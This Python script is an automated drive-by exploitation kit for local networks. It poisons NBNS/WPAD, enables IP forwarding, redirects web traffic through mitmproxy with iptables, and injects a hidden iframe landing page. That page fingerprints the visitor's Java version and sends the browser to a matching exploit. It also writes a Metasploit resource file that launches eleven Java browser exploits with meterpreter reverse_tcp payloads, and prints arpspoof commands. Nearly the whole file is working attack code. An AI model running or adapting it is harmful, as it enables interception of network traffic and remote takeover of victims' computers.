from twisted.web.server import Site
from twisted.web.static import File
from twisted.web import server, resource
from twisted.internet import reactor, protocol
import os,socket,struct,fcntl,sys,commands,time
from subprocess import Popen, PIPE
from termcolor import colored, cprint

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sockfd = sock.fileno()
SIOCGIFADDR = 0x8915

#References for Java Exploits
#CVE-2012-0500	
#exploit/windows/browser/java_ws_vmargs
#windows/meterpreter/reverse_tcp  
#JDK/JRE 7 update 2 and earlier
#JDK/JRE 6 update 30 and earlier

#CVE-2012-0507	
#exploit/multi/browser/java_atomicreferencearray 
#java/meterpreter/reverse_tcp  
#JDK/JRE 7 update 2 and earlier
#JDK/JRE 6 update 30 and earlier
#JDK/JRE 5 update 33 and earlier

#CVE-2012-1723	
#exploit/multi/browser/java_verifier_field_access
#java/meterpreter/reverse_tcp 
#JDK/JRE 7 update 4 and earlier
#JDK/JRE 6 update 32 and earlier
#JDK/JRE 5 update 35 and earlier

#CVE-2012-4681	
#exploit/multi/browser/java_jre17_exec  
#java/meterpreter/reverse_tcp  
#JDK/JRE 7 update 6 and earlier
#JDK/JRE 6 update 34 and earlier

#CVE-2012-5088	
#exploit/multi/browser/java_jre17_method_handle  
#java/meterpreter/reverse_tcp
#JDK/JRE 7 update 7 and earlier
#JDK/JRE 6 update 35 and earlier
#JDK/JRE 5 update 36 and earlier

#CVE-2012-1533	
#exploit/windows/browser/java_ws_double_quote 
#windows/meterpreter/reverse_tcp 
#JDK/JRE 7 update 7 and earlier
#JDK/JRE 6 update 35 and earlier

#CVE-2013-0422	
#exploit/multi/browser/java_jre17_jmxbean 
#java/meterpreter/reverse_tcp   
#JDK/JRE 7 update 10 and earlier

#CVE-2013-0431	
#exploit/multi/browser/java_jre17_jmxbean_2 
#java/meterpreter/reverse_tcp   
#JDK/JRE 7 update 11 and earlier

#CVE-2013-1493	
#exploit/windows/browser/java_cmm  
#windows/meterpreter/reverse_tcp  
#JDK/JRE 7 update 15 and earlier
#JDK/JRE 6 update 41 and earlier
#JDK/JRE 5 update 40 and earlier

#CVE-2013-1488	
#exploit/multi/browser/java_jre17_driver_manager  
#java/meterpreter/reverse_tcp   
#JDK/JRE 7 update 17 and earlier

#CVE-2013-2465	
#exploit/multi/browser/java_storeimagearray
#java/meterpreter/reverse_tcp 
#JDK/JRE 7 update 21 and earlier
#JDK/JRE 6 update 45 and earlier
#JDK/JRE 5 update 45 and earlier

def createWPAD(localIP):
        contents = 'function FindProxyForURL(url, host) {if (isInNet(host, "127.0.0.1","255.255.255.0")){return "DIRECT";}return "PROXY '+localIP+':8080; DIRECT";}'
        file = open("wpad.dat","w")
        file.write(contents)
        file.close()

def createHTML(localIP,metasploitIP):
	#Create iframe landing page to provide plugin detection and redirection to metasploit
	file = open("pluginDetect4.htm", "w")
	file.write("<head>")
	file.write("<iframe id=\"iframe1\" src=\"about:blank\" width=0 height=0 style=\"hidden\" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>")
	
	file.write('<script type="text/javascript" src="http://'+localIP+'/PluginDetect_All.js"></script>')
	file.write('<script type="text/javascript" src="http://'+localIP+'/beefclone.js"></script>')
	file.write('<script type="text/javascript" src="http://'+localIP+'/savecookies.js"></script>')
	
	file.write('<script type="text/javascript">')
        file.write('var visits = GetCookie("counter");')
        file.write('if (!visits) { visits = 1; }')
	#file.write('alert(visits);')
	javascriptCode = ""
	
	javascriptCode += 'if (visits<3) {splitJavaVer = (PluginDetect.getVersion("java")).split(",");'

        file.write('visits = parseInt(visits) + 1;')
        file.write('setCookie("counter", visits,expdate);')
	#file.write('alert(PluginDetect.getVersion("java"));')

	javascriptCode += 'javaMajorVer = splitJavaVer[1];'
	javascriptCode += 'javaMinVer = splitJavaVer[3];'
	javascriptCode += 'var sink="";'

        javascriptCode += 'if(javaMajorVer==7 && javaMinVer<=2)  sink="CVE-2012-0500";'
        javascriptCode += 'if(javaMajorVer==7 && javaMinVer<=2)  sink="CVE-2012-0507";'
        javascriptCode += 'if(javaMajorVer==7 && javaMinVer<=4)  sink="CVE-2012-1723";'
        javascriptCode += 'if(javaMajorVer==7 && javaMinVer<=6)  sink="CVE-2012-4681";'
        javascriptCode += 'if(javaMajorVer==7 && javaMinVer<=7)  sink="CVE-2012-5088";'
        javascriptCode += 'if(javaMajorVer==7 && javaMinVer<=7)  sink="CVE-2012-1533";'
        javascriptCode += 'if(javaMajorVer==7 && javaMinVer<=10) sink="CVE-2013-0422";'
        javascriptCode += 'if(javaMajorVer==7 && javaMinVer<=11) sink="CVE-2013-0431";'
        javascriptCode += 'if(javaMajorVer==7 && javaMinVer<=15) sink="CVE-2013-1493";'
        javascriptCode += 'if(javaMajorVer==7 && javaMinVer<=17) sink="CVE-2013-1488";'
        javascriptCode += 'if(javaMajorVer==7 && javaMinVer<=21) sink="CVE-2013-2465";'

        javascriptCode += 'if(javaMajorVer==6 && javaMinVer<=30) sink="CVE-2012-0500";'
        javascriptCode += 'if(javaMajorVer==6 && javaMinVer<=30) sink="CVE-2012-0507";'
        javascriptCode += 'if(javaMajorVer==6 && javaMinVer<=32) sink="CVE-2012-1723";'
        javascriptCode += 'if(javaMajorVer==6 && javaMinVer<=34) sink="CVE-2012-4681";'
        javascriptCode += 'if(javaMajorVer==6 && javaMinVer<=35) sink="CVE-2012-5088";'
        javascriptCode += 'if(javaMajorVer==6 && javaMinVer<=35) sink="CVE-2012-1533";'
        javascriptCode += 'if(javaMajorVer==6 && javaMinVer<=41) sink="CVE-2013-1493";'
        javascriptCode += 'if(javaMajorVer==6 && javaMinVer<=45) sink="CVE-2013-2465";'

        javascriptCode += 'if(javaMajorVer==5 && javaMinVer<=33) sink="CVE-2012-0507";'
        javascriptCode += 'if(javaMajorVer==5 && javaMinVer<=35) sink="CVE-2012-1723";'
        javascriptCode += 'if(javaMajorVer==5 && javaMinVer<=36) sink="CVE-2012-5088";'
        javascriptCode += 'if(javaMajorVer==5 && javaMinVer<=40) sink="CVE-2013-1493";'
        javascriptCode += 'if(javaMajorVer==5 && javaMinVer<=45) sink="CVE-2013-2465";'

	javascriptCode += 'var metasploitLink="http://'+metasploitIP+'/"+sink'+';'
	
	javascriptCode += 'var pluginDetect="http://'+localIP+'/detectVersion.asp?"+getVersion()'+';'
	javascriptCode += 'document.getElementById("iframe1").src=pluginDetect;'
	javascriptCode += 'var cveNo="http://'+localIP+'/detectVersion.asp?CVE="+sink'+';'
	javascriptCode += 'document.getElementById("iframe1").src=cveNo;'
	javascriptCode += 'document.getElementById("iframe1").src=metasploitLink;}'

	#javascriptCode += 'alert(metasploitLink);'		
	file.write(javascriptCode)	

        #alert(visits);
	file.write('</script>')
	file.write("<head>")
	file.write("</html>")
	file.close()

def createMetasploitRC(metasploitIP):
	javaExploits = []
	javaExploits.append("exploit/windows/browser/java_ws_vmargs")
	javaExploits.append("exploit/multi/browser/java_atomicreferencearray")
	javaExploits.append("exploit/multi/browser/java_verifier_field_access")
	javaExploits.append("exploit/windows/browser/java_ws_vmargs")
	javaExploits.append("exploit/multi/browser/java_jre17_method_handle")
	javaExploits.append("exploit/multi/browser/java_jre17_jmxbean")
	javaExploits.append("exploit/windows/browser/java_cmm")
	javaExploits.append("exploit/multi/browser/java_jre17_driver_manager")
	javaExploits.append("exploit/windows/browser/java_ws_double_quote")
	javaExploits.append("exploit/multi/browser/java_jre17_exec")
	javaExploits.append("exploit/multi/browser/java_storeimagearray")	

	javaCVE = []
	javaCVE.append("")	
	javaCVE.append("CVE-2012-0507")	
	javaCVE.append("CVE-2012-1723")	
	javaCVE.append("CVE-2012-4681")	
	javaCVE.append("CVE-2012-5088")
	javaCVE.append("CVE-2012-1533")
	javaCVE.append("CVE-2012-0422")		
	javaCVE.append("CVE-2013-0431")	
	javaCVE.append("CVE-2013-1493")	
	javaCVE.append("CVE-2013-1488")	
	javaCVE.append("CVE-2013-2465")	

	payloads = []
	payloads.append("windows/meterpreter/reverse_tcp")
	payloads.append("java/meterpreter/reverse_tcp")
	payloads.append("java/meterpreter/reverse_tcp")
	payloads.append("windows/meterpreter/reverse_tcp")
	payloads.append("java/meterpreter/reverse_tcp")
	payloads.append("java/meterpreter/reverse_tcp")
	payloads.append("windows/meterpreter/reverse_tcp")
	payloads.append("java/meterpreter/reverse_tcp")
	payloads.append("windows/meterpreter/reverse_tcp")
	payloads.append("java/meterpreter/reverse_tcp")
	payloads.append("java/meterpreter/reverse_tcp")

	srvPORTs = []
	srvPORTs.append("4001")
	srvPORTs.append("4002")
	srvPORTs.append("4003")
	srvPORTs.append("4004")
	srvPORTs.append("4005")
	srvPORTs.append("4006")
	srvPORTs.append("4007")
	srvPORTs.append("4008")
	srvPORTs.append("4009")
	srvPORTs.append("4010")
	srvPORTs.append("4011")
	
	#Create metasploit resource file
	#metasploitIP = "127.0.0.1"
	#localIP = "127.0.0.1"
	#metasploitIP = get_ip('eth0:1')

        metasploitResource = "use auxiliary/spoof/nbns/nbns_response\nset regex WPAD\nset spoofip "+get_ip('eth0:1')+"\nrun\n"
        metasploitResource += "use auxiliary/server/wpad\nset SRVPORT 81\nset SRVHOST "+get_ip('eth0:1')+"\nset PROXY "+get_ip('eth0')+"\nset verbose true\nexploit\n"	
	metasploitResource += "setg exitonsession false\nsetg LHOST "+metasploitIP+"\nsetg SRVPORT 80\nsetg SRVHOST "+metasploitIP+"\nsleep 5\n"
	count=0
	LPORT=4000
	totalNum=len(javaExploits)
	while count<totalNum:
		metasploitResource+="use "+javaExploits[count]+"\n"
		metasploitResource+="set PAYLOAD "+payloads[count]+"\n"
		#metasploitResource+="set PAYLOAD java/meterpreter/reverse_tcp\n"
		metasploitResource+="set URIPATH /"+javaCVE[count]+"\n"
		metasploitResource+="set LPORT "+srvPORTs[count]+"\n"
		metasploitResource+="set SRVPORT 80\n"
		#metasploitResource+="set LPORT "+str(LPORT)+"\n"
		metasploitResource+="exploit -jz\n"
		metasploitResource+="sleep 5\n"
		LPORT+=1
		count+=1	
	file = open("msf1.rc", "w")
	file.write(metasploitResource)
	file.close()

def get_ip(iface = 'eth0'):
        ifreq = struct.pack('16sH14s', iface, socket.AF_INET, '\x00'*14)
        try:
                res = fcntl.ioctl(sockfd, SIOCGIFADDR, ifreq)
        except:
                return None
        ip = struct.unpack('16sH2x4s8x', res)[2]
        return socket.inet_ntoa(ip)

#Check if eth0 and eth0:1 exists
mycmd = "ifconfig | grep eth0 | awk '{print $1}'"
output = commands.getstatusoutput(mycmd)
print output
if(len(output[1])<11):
	print "[!] Setting up eth0:1 interface"
	localIP = get_ip('eth0')

	localIPsplit = localIP.split(".")
	lastDigit = int(localIPsplit[3])+1
	newInterface = localIPsplit[0]+"."+localIPsplit[1]+"."+localIPsplit[2]+"."+str(lastDigit)
	#print "[!] ifconfig eth0:1 "+newInterface+"\n"
	mycmd = "ifconfig eth0:1 "+newInterface
	commands.getstatusoutput(mycmd)

	localIP = get_ip('eth0:1')

	lastDigit = int(localIPsplit[3])+2
	newInterface = localIPsplit[0]+"."+localIPsplit[1]+"."+localIPsplit[2]+"."+str(lastDigit)
	#print "[!] ifconfig eth0:1 "+newInterface+"\n"
	mycmd = "ifconfig eth0:2 "+newInterface
	commands.getstatusoutput(mycmd)

#Enable ip forwarding
mycmd = "echo 1 > /proc/sys/net/ipv4/ip_forward"
commands.getstatusoutput(mycmd)

#Forward traffic from port 80 to port 8080 (mitmproxy)
mycmd = []
mycmd.append("iptables --flush")
mycmd.append("iptables -t nat --flush")
mycmd.append("iptables --zero")
mycmd.append("iptables -A FORWARD --in-interface eth0 -j ACCEPT")
mycmd.append("iptables -t nat -A PREROUTING -i eth0 -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
mycmd.append("iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080")
for cmdi in mycmd:
	commands.getstatusoutput(cmdi)

localIP = get_ip('eth0:1')
print "Server IP (eth0:1) "+"\t"+localIP
metasploitIP = get_ip('eth0:2')
print "Metasploit IP (eth0:2) "+"\t"+metasploitIP

createWPAD(localIP)
createMetasploitRC(metasploitIP)
createHTML(localIP,metasploitIP)

#Run mitmproxy to inject the iframe
mitmproxyPath = "python "+os.getcwd()+"/iframe_injector http://"+localIP+"/pluginDetect4.htm"
iframeURL = "http://"+localIP+"/pluginDetect4.htm"
args = "[+] Run '"+mitmproxyPath+"'"
print colored(args,'green',attrs=['bold'])
#p1 = Popen(args1,shell=True)

#Allow an IP to request the resource only once
bannedIPs = []
class Simple(resource.Resource):
    count=0
    isLeaf = True
    def render_GET(self, request):
	clientIP = request.getClientIP()
	#if clientIP not in bannedIPs:
	file = request.path.strip("/")
	if("detectVersion.asp" not in file):
		if("favicon.ico" not in file):	
			count = bannedIPs.count(clientIP)
			#print count
			#if count<99:
			#if count==0:
			print colored("Client IP: "+clientIP,'green',attrs=['bold'])
			bannedIPs.append(clientIP)
			with open(file) as source:
				return source.read()
	else:
		#count = bannedIPs.count(clientIP)
		#if count<99:
		queryString = (str(request).strip("HTTP/1.1>")).split("?")
		parameters = queryString[1].split("&")
		for parameter in parameters:
			parameter = parameter.strip()
			parameter = parameter.replace("%20"," ")
			if "CVE" in parameter:
				print colored(parameter,'yellow',attrs=['bold'])
			else:
				print parameter	
#Run metasploit

mycmd = "netstat -rn | grep 0.0.0.0 | awk '{print $2}' | grep -v '0.0.0.0'"
gateway = commands.getstatusoutput(mycmd)

args = "[+] Run 'msfconsole -r "+os.getcwd()+"/msf1.rc'"
#p2 = Popen(args,shell=True)
print colored(args,'green',attrs=['bold'])
args = "[+] Run 'arpspoof -i eth0 -t "+sys.argv[1]+" "+str(gateway[1])+"'"
print colored(args,'green',attrs=['bold'])

#Web server for serving iframe landing page
site = server.Site(Simple())
reactor.listenTCP(80, site,interface=localIP)
try:
	reactor.run()
except KeyboardInterrupt:
        print "Interrupted by keyboard. Exiting."
        reactor.stop()
	os.system("killall -9 screen");

